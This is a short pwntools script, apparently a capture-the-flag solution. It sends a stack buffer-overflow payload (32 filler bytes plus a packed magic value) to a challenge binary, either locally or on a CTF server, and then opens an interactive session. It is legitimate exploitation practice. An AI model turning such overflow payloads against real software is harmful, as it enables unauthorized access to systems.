from pwn import p32, ELF, context, process, remote

def exploit(checkRemote):
    if (checkRemote==True):
        r = remote('codefest-ctf.iitbhu.tech', 13323)
    else:
        context.binary = binary = ELF('./chall')
        r = process()
    
    payload = b'A' * 32 + p32(0x23456723)
    r.recvuntil('Admin?\n')
    r.sendline(payload)
    r.interactive()

exploit(False)